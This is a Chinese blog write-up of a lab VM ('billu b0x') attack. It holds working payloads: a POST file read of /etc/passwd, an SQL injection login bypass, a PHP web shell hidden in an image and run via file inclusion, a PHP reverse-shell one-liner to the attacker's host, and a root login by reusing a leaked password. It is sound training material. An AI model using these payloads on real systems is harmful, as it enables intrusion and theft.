<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.6</span><span class="regexp">/test?file=/</span>etc/passwd</span><br></pre></td></tr></table></figure>
<p>很遗憾，读取不了。<br>莫非是没用定向？尝试目录遍历</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.6</span><span class="regexp">/test?file=../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p>e，没鸟用。<br>那么尝试post请求。可以使用bp，但还是用命令行吧。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -d <span class="string">&quot;file=/etc/passwd&quot;</span> http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">200.6</span>/test</span><br><span class="line"><span class="regexp">//</span>采用post的方式添加参数即可(-d相当于--data，添加POST的参数)：</span><br></pre></td></tr></table></figure>
<p><img src="https://pic.imgdb.cn/item/6569fc54c458853aef2f1ac8.jpg"><br>这里引用一张图片来说明其中的意思。<br><img src="https://pic.imgdb.cn/item/6569fc7fc458853aef2fea70.png"><br>在这个passwd文件，重点寻找有bash的用户，发现除了root，就只有一个ica，这或许是我们重点关注的账户。</p>
<h4 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h4><p>其他的目录，&#x2F;c、&#x2F;show为空，&#x2F;panel目录，来了一个重定向，应该是之前登陆界面如果登陆上的话，就会跳转到这里；&#x2F;head2，是一张图片，暂时不知道是什么。</p>
<h2 id="三、代码审计"><a href="#三、代码审计" class="headerlink" title="三、代码审计"></a>三、代码审计</h2><p>我们可以使用之前的文件包含漏洞进行文件下载从而开始代码审计。</p>
<h3 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">file_download</span>(<span class="params"><span class="variable">$download</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$download</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Description: File Transfer&quot;</span>); </span><br><span class="line">					</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Transfer-Encoding: binary&#x27;</span>);</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Expires: 0&#x27;</span>);</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Cache-Control: must-revalidate, post-check=0, pre-check=0&#x27;</span>);</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Pragma: public&#x27;</span>);</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Accept-Ranges: bytes&#x27;</span>);</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$download</span>).<span class="string">&#x27;&quot;&#x27;</span>); </span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Length: &#x27;</span> . <span class="title function_ invoke__">filesize</span>(<span class="variable">$download</span>));</span><br><span class="line">					<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span>); </span><br><span class="line">					<span class="title function_ invoke__">ob_clean</span>();</span><br><span class="line">					<span class="title function_ invoke__">flush</span>();</span><br><span class="line">					<span class="title function_ invoke__">readfile</span> (<span class="variable">$download</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;file not found&quot;</span>;	</span><br><span class="line">				&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">file_download</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;file\&#x27; parameter is empty. Please provide file path in \&#x27;file\&#x27; parameter &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进一步验证了这个文件包含漏洞可以进行文件下载。</p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]!=<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]==<span class="literal">true</span> &amp;&amp;  <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]!=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are logged in :)&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: panel.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=center style=&quot;margin:30px 0px 0px 0px;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;font size=8 face=&quot;comic sans ms&quot;&gt;--==[[ billu b0x ]]==--&lt;/font&gt; </span></span><br><span class="line"><span class="string">&lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">Show me your SQLI skills &lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;form method=post&gt;</span></span><br><span class="line"><span class="string">Username :- &lt;Input type=text name=un&gt; &amp;nbsp Password:- &lt;input type=password name=ps&gt; &lt;br&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=login value=&quot;let\&#x27;s login&quot;&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;login&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$uname</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line">	<span class="variable">$pass</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line">	<span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$run</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>);</span><br><span class="line">	   <span class="keyword">echo</span> <span class="string">&quot;You are allowed&lt;br&gt;&quot;</span>;</span><br><span class="line">	   <span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]=<span class="literal">true</span>;</span><br><span class="line">	   <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]=<span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	   </span><br><span class="line">	 <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: panel.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Try again&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;font size=5 face=\&quot;comic sans ms\&quot; style=\&quot;left: 0;bottom: 0; position: absolute;margin: 0px 0px 5px;\&quot;&gt;B0X Powered By &lt;font color=#ff9933&gt;Pirates&lt;/font&gt; &quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先，从下面这段代码可以看出包含了两个文件，待会也下载康康。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>其次，找到了其验证登录的逻辑。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash"><span class="built_in">uname</span>=str_replace(<span class="string">&#x27;\&#x27;</span><span class="string">&#x27;,&#x27;</span><span class="string">&#x27;,urldecode($_POST[&#x27;</span>un<span class="string">&#x27;]));</span></span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash"><span class="string">pass=str_replace(&#x27;</span>\<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">run=<span class="string">&#x27;select * from auth where  pass=\&#x27;</span><span class="string">&#x27;.$pass.&#x27;</span>\<span class="string">&#x27; and uname=\&#x27;</span><span class="string">&#x27;.$uname.&#x27;</span>\<span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="meta prompt_">	$</span><span class="language-bash">result = mysqli_query(<span class="variable">$conn</span>, <span class="variable">$run</span>);</span></span><br></pre></td></tr></table></figure>
<p><code>这里其实就是先把前端输入进来的&#39;过滤成空格，然后拼接上自己的&#39;</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * from auth <span class="built_in">where</span>  pass=\<span class="string">&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27;</span> and <span class="built_in">uname</span>=\<span class="string">&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;</span></span><br></pre></td></tr></table></figure>
<p>其实也就是</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> auth <span class="keyword">where</span>  pass=<span class="string">&#x27;.$pass.&#x27;</span> and uname=<span class="string">&#x27;.$uname.&#x27;</span></span><br></pre></td></tr></table></figure>
<p>具体传输数据时，假设我传输1’ or 1&#x3D;1#时，由于存在过滤，那么会变成：</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> auth <span class="keyword">where</span>  pass=<span class="string">&#x27;1 or 1=1#&#x27;</span> and uname=<span class="string">&#x27;1&#x27;</span></span><br></pre></td></tr></table></figure>
<p>那么万能密码就失效了<br><code>利用转义符\可以使&#39;失效，即\&#39;的思路</code><br>所以观察可以知道，当我pass传入,uname传入or 1&#x3D;1#时，sql语句就变成了</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> auth <span class="keyword">where</span>  pass=<span class="string">&#x27;\&#x27; and uname=&#x27;</span>or <span class="number">1</span>=<span class="number">1</span><span class="meta">#&#x27;</span></span><br></pre></td></tr></table></figure>
<p>即可实现万能密码登录。<br><img src="https://pic.imgdb.cn/item/6569fc8ec458853aef303416.jpg"><br>这里虽然进入了一个新的界面，难道是后台？先不理，吧把剩下的代码审完。</p>
<h3 id="c-php"><a href="#c-php" class="headerlink" title="c.php"></a>c.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#header( &#x27;Z-Powered-By:its chutiyapa xD&#x27; );</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;X-Frame-Options: SAMEORIGIN&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="string">&#x27;Server:testing only&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="string">&#x27;X-Powered-By:testing only&#x27;</span> );</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>( <span class="string">&#x27;session.cookie_httponly&#x27;</span>, <span class="number">1</span> );</span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;billu&quot;</span>,<span class="string">&quot;b0x_billu&quot;</span>,<span class="string">&quot;ica_lab&quot;</span>);</span><br><span class="line"><span class="comment">// Check connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;connection failed -&gt;  &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>这里发现了数据库的密码，但是暂时没看到数据库啊</code></p>
<h3 id="panel-php"><a href="#panel-php" class="headerlink" title="panel.php"></a>panel.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;c.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;head2.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]!=<span class="literal">true</span> )</span><br><span class="line">&#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Welcome to billu b0x &quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post style=&quot;margin: 10px 0px 10px 95%;&quot;&gt;&lt;input type=submit name=lg value=Logout&gt;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;lg&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;logged&#x27;</span>]);</span><br><span class="line">	<span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]);</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: index.php&#x27;</span>, <span class="literal">true</span>, <span class="number">302</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;form method=post&gt;</span></span><br><span class="line"><span class="string">&lt;select name=load&gt;</span></span><br><span class="line"><span class="string">    &lt;option value=&quot;show&quot;&gt;Show Users&lt;/option&gt;</span></span><br><span class="line"><span class="string">	&lt;option value=&quot;add&quot;&gt;Add User&lt;/option&gt;</span></span><br><span class="line"><span class="string">&lt;/select&gt; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &amp;nbsp&lt;input type=submit name=continue value=&quot;continue&quot;&gt;&lt;/form&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$dir</span>=<span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">	<span class="variable">$choice</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;./&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">       		<span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$choice</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">die</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$name</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="variable">$address</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;address&#x27;</span>]);</span><br><span class="line">	<span class="variable">$id</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$iname</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">	<span class="variable">$r</span>=<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line">	<span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$r</span>,<span class="variable">$image</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$finfo</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">finfo</span>(FILEINFO_MIME); </span><br><span class="line">	<span class="variable">$filetype</span> = @<span class="variable">$finfo</span>-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/jpeg/&#x27;</span>,<span class="variable">$filetype</span> )  || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/png/&#x27;</span>,<span class="variable">$filetype</span> ) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/image\/gif/&#x27;</span>,<span class="variable">$filetype</span> ))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;uploaded_images/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))</span><br><span class="line">							 &#123;</span><br><span class="line">							  <span class="keyword">echo</span> <span class="string">&quot;Uploaded successfully &quot;</span>;</span><br><span class="line">							  <span class="variable">$update</span>=<span class="string">&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$address</span>.<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="variable">$iname</span>.<span class="string">&#x27;\&#x27;, \&#x27;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;\&#x27;)&#x27;</span>; </span><br><span class="line">							 <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$update</span>);</span><br><span class="line">							&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里发现又存在一个head2.php。<br>然后就是一些对文件上传的限制（存在白名单）。<br>其他php文件没发现什么特别的。</p>
<h2 id="四、利用文件上传漏洞尝试getshell-反弹shell"><a href="#四、利用文件上传漏洞尝试getshell-反弹shell" class="headerlink" title="四、利用文件上传漏洞尝试getshell|反弹shell"></a>四、利用文件上传漏洞尝试getshell|反弹shell</h2><h3 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h3><p>由于存在白名单验证，那么先上传一个图片马康康。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">copy</span> tupian.png+muma.php <span class="type">name</span>.png</span><br></pre></td></tr></table></figure>
<p>成功上传，接下来康康连接不连接得上。<br><img src="https://pic.imgdb.cn/item/6569fce2c458853aef31d135.jpg"></p>
<h3 id="尝试连接"><a href="#尝试连接" class="headerlink" title="尝试连接"></a>尝试连接</h3><p>这里我直接点这个文件，但是连接不上，正常，因为图片马要配合解析漏洞才可正常连接。<br><code>那么我们就要寻找其他的路径触发php代码执行。首先想到的路径就是panel.php本身，因为这个php页面可以包含其他的php文件</code><br>具体就是这个页面不是有两个功能吗，查看图片以及添加图片<br>当我们分别对两个功能抓包时，观察load字段。<br><img src="https://pic.imgdb.cn/item/6569fcefc458853aef320e95.jpg"><br><img src="https://pic.imgdb.cn/item/6569fcf8c458853aef323b0c.jpg"><br>懂了吧？反正我大概是懂了…吧<br>所以进行改包后（load换成你的图片马地址，并且在get中传入你要执行的命令），成功执行，相当于getshell了。<br><img src="https://pic.imgdb.cn/item/6569fd02c458853aef326c07.jpg"></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>getshell后，我们要进一步获取控制权，所以要反弹shell。<br>把刚才执行ls的那里替换为</p>
<figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;192.168.200.4&quot;</span>,<span class="number">5599</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br></pre></td></tr></table></figure>
<p>同时，kali上开启监听5577这一个端口。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvnp <span class="number">5599</span></span><br></pre></td></tr></table></figure>
<p>但尴尬的是，并没有成功反弹。<br><code>可是之前已经尝试了，刚刚这里已经成功代码执行了呀。那估计就是url编码的问题了，我们把这个反弹shell的语句进行url编码即可反弹成功</code><br>那么进行url编码后再尝试，成功反弹。<br><img src="https://pic.imgdb.cn/item/6569fd0dc458853aef32a0cb.jpg"></p>
<h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><p>上面我们说到，我们成功黑进了对方网站的服务器，那么我们的权限肯定是很低的，所以接下来我们要进行提权。<br>先尝试查看当前的权限</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>
<p>这是shell启动不全面的情况造成的。<br><img src="https://pic.imgdb.cn/item/6569fd24c458853aef330c50.jpg"><br>那么尝试使用python启动shell</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
<p>继续查看权限。什么？要密码？看来此路不通。<br><img src="https://pic.imgdb.cn/item/6569fd37c458853aef336a0a.jpg"><br>那么查看一下当前目录有啥好东西</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">al</span></span><br></pre></td></tr></table></figure>
<p>发现phpmy，应该是phpmyadmin（看来信息收集没有做全啊！！！）<br><img src="https://pic.imgdb.cn/item/6569fd44c458853aef33a76e.jpg"><br>进入phpmy目录，哇靠，一堆好东西（尤其是这个配置文件）。<br><img src="https://pic.imgdb.cn/item/6569fd4dc458853aef33d0ea.jpg"><br>cat一下，得到用户名与密码。<br><img src="https://pic.imgdb.cn/item/6569fd55c458853aef33f9c8.jpg"><br>这应该是个数据库的密码，不过我们也可以碰撞尝试ssh登录root账户。<br><img src="https://pic.imgdb.cn/item/6569fd5ec458853aef34207c.jpg"><br>成功提权。</p>
<h2 id="六、拓展"><a href="#六、拓展" class="headerlink" title="六、拓展"></a>六、拓展</h2><p>其实提权这一块有很多种方法，我第一时间是想利用msf进行提权的，也就是内核提权，但是search exp后，发现数量过多，定位到特定版本，又显示无exp。<br>具体看这位师傅（searchsploit）：<a href="https://blog.csdn.net/2301_76329510/article/details/130187477">https://blog.csdn.net/2301_76329510/article/details/130187477</a></p>
<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p>1、信息收集做得还是不到位，一些重要的目录没有探针到。比如&#x2F;phpmy，如果前期探针到的话…,那么可以省去sql注入，利用c.php里面的用户名以及密码，或许可以登陆进去,进去后，可以查找到index.php的账号密码。<br><img src="https://pic.imgdb.cn/item/656a9ccdc458853aefba008a.jpg"><br>省事。<br>2、图片马正常情况下无法使用，只可配合解析漏洞或者文件包含漏洞才可使用。<br><code>3、sqlmap使用姿势</code><br>如果已经通过手动sql测试确认存在sql注入，但是使用sqlmap却没有扫描出payload的情况下，可以尝试使用 -technique、-level和-v 命令</p>
